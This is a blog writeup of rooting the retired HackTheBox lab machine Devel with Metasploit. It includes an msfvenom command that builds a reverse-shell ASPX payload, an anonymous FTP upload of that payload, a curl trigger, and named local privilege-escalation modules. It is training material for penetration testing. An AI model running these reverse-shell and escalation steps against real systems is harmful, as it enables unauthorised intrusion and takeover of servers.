---
layout: post
title: "Writeup: HackTheBox Devel - with Metasploit"
description: "Rooting Devel using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][].
All published writeups are for retired HTB machines.
Whether or not I use Metasploit to pwn the server will be indicated in the title.

# Devel

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.5</small>_

As always, I start enumeration with [AutoRecon][]. The open ports are TCP/21 and TCP/80. While AutoRecon continues
 scanning, I look into the FTP server. It allows anonymous login! I note that in my mind map and leave it for now to
  check on the results of AutoRecon.

I look at what the nmap HTTP script scan found:

![http-scans-command][]

At the bottom of the results, I see a CVE was found:

![http-scans-vuln][]

I see this CVE is tied to [MS-15-034][] and run that through searchsploit:

![searchsploit-results][]

I take a look at the C exploit:

![exploit-code-top][]

I see that the main body of the payload is simply running a validation on whether the target is vulnerable to this CVE.

![exploit-code-main][]

Well, that would still be useful so let's compile and execute the code:

![compile-check][]

Great. Now what?

I back off and take another look at my enumeration results. I know this is a Windows machine because the server at
 TCP/80 is running IIS. I know it has a CVE. I know that I have anonymous access via FTP to the server, to a
  directory that appears to host the web server's files.
  
Ah. Ok.

Let's generate a reverse TCP meterpreter payload with msfvenom, push it to the target via FTP, then call it from the
 web server to execute and establish a shell back to my box.

The payload command is:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.33 LPORT=4444 -f aspx > devel.aspx
```

Substitute the LHOST and LPORT as applicable for your system.

I can now push the file via FTP with `put`:

```bash
ftp 10.10.10.5
# anonymous login
> put ./devel.aspx
```

Then I need to start a meterpreter handler on my machine listening on LPORT.

```bash
sudo msfconsole
msf> workspace htb
msf> use windows/meterpreter/reverse_tcp
```

I just need to set my local IP:

![meterpreter-reverse-options][]

Then I can set up a local listener by converting this to a handler:

![meterpreter-reverse-handler][]

I can now execute my payload with a curl command:

```bash
curl http://10.10.10.5/devel.aspx
```

Meterpreter records the session (ignore the `whoami -> root` command, I was confused on what terminal I was in):

![meterpreter-web-shell][]

I can now connect to the session I've created:

![meterpreter-session][]

Now let's gather information on the system and check what user I am:

![meterpreter-sysinfo][]

Ok, this is a Windows 7 machine with x86 architecture. I am logged in as the IIS user, which isn't going to give me
 much. I can't even write to my current directory. But, I should be able to write to `C:\Windows\TEMP`. I navigate
  over to there and then use `local_exploit_suggestor` to suggest some exploit modules I can run to elevate my shell
   to administrator.

![local-exploit-suggestor][]

The machine seems to be vulnerable to `exploit/windows/local/bypassuac_eventvwr` - let's try that.

It is unsuccessful, as my IIS user isn't in the Administrators group. On to the next.

![escalate-failed][]

The second exploit, `exploit/windows/local/ms10_015_kitrap0d` is successful.

![root-shell][]

I can now go and retrieve the user and root flags.

![user-flag][]

![root-flag][]

[autorecon]: https://github.com/Tib3rius/AutoRecon
[hackthebox]: https://www.hackthebox.eu
[ms-15-034]: https://docs.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-034

[compile-check]: /img/htb/devel/compile-vuln-check.png
[escalate-failed]: /img/htb/devel/escalate-failed.png
[exploit-code-top]: /img/htb/devel/exploit-code-1.png
[exploit-code-main]: /img/htb/devel/exploit-code-main-method.png
[http-scans-command]: /img/htb/devel/nmap-http-scans-command.png
[http-scans-vuln]: /img/htb/devel/nmap-http-scans-vuln-found.png
[local-exploit-suggestor]: /img/htb/devel/show-local-exploits.png
[meterpreter-reverse-handler]: /img/htb/devel/meterpreter-reverse-shell-handler.png
[meterpreter-reverse-options]: /img/htb/devel/meterpreter-reverse-shell-options.png
[meterpreter-session]: /img/htb/devel/meterpreter-sessions-reconnect.png
[meterpreter-sysinfo]: /img/htb/devel/meterpreter-sysinfo.png
[meterpreter-web-shell]: /img/htb/devel/meterpreter-web-shell.png
[root-flag]: /img/htb/devel/root-flag.png
[root-shell]: /img/htb/devel/meterpreter-root-shell.png
[searchsploit-results]: /img/htb/devel/searchsploit-results.png
[user-flag]: /img/htb/devel/user-flag.png
